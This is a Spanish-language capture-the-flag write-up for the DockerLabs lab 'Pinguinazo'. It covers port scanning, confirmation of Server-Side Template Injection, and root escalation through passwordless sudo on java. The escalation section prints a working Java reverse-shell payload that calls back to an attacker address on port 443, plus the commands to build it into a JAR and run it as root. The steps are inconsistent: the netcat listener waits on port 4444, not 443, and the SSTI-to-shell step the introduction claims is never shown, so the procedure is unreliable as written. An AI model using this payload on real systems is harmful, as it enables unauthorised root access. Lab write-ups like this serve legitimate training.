## Introducción

Este documento presenta la resolución completa de la máquina **Pinguinazo**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
El laboratorio expone un servidor web en el puerto 5000 con un formulario que procesa entradas de usuario mediante un motor de plantillas. Se identifica una vulnerabilidad de **Server-Side Template Injection (SSTI)**, permitiendo la ejecución de comandos del sistema mediante el acceso al módulo `os` de Python. Con esto, se obtiene una reverse shell como el usuario `pinguinazo`.
Una vez dentro, se identifica una configuración insegura de `sudo` que permite ejecutar `java` como root sin autenticación. Se compila y ejecuta un archivo JAR malicioso que establece una reverse shell con privilegios de `root`, completando la escalada de privilegios.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Pinguinazo.zip
sudo bash auto_deploy.sh Pinguinazo.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1761717544/Ip_kdnyha.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Pinguinazo/{content,exploits,nmap,scripts}
cd Pinguinazo
```

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **5000/tcp** — HTTP

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Confirmación de SSTI

En el formulario de `/greet`, se envía una prueba de expresión:

```
{{ 7 * 7 }}
```

La página devuelve `49`, confirmando que la entrada se evalúa en un motor de plantillas (SSTI).

![Test SSTI](https://res.cloudinary.com/dewqswzke/image/upload/v1761717369/TestSSTI_asdamt.png)


## Paso 3 — Escalada de privilegios

### 3.1 De pinguinazo → root

Se verifican los permisos sudo:

```bash
sudo -l
```

![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1761717369/Sudo-l_reiqvw.png)

El usuario puede ejecutar `java` como root sin contraseña.

Se crea un exploit en Java:

**Exploit.java**

```java
import java.io.*;

public class Exploit {
    public static void main(String[] args) throws Exception {
        String[] cmd = {"/bin/sh", "-c", "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"};
        Runtime.getRuntime().exec(cmd);
    }
}
```

**manifest.txt**

```
Main-Class: Exploit
```

Se compila y empaqueta:

```bash
javac Exploit.java
jar cfm exploit.jar manifest.txt Exploit.class
```

Se inicia un listener en la máquina atacante:

```bash
nc -nlvp 4444
```

Se ejecuta el JAR con `sudo`:

```bash
sudo java -jar exploit.jar
```
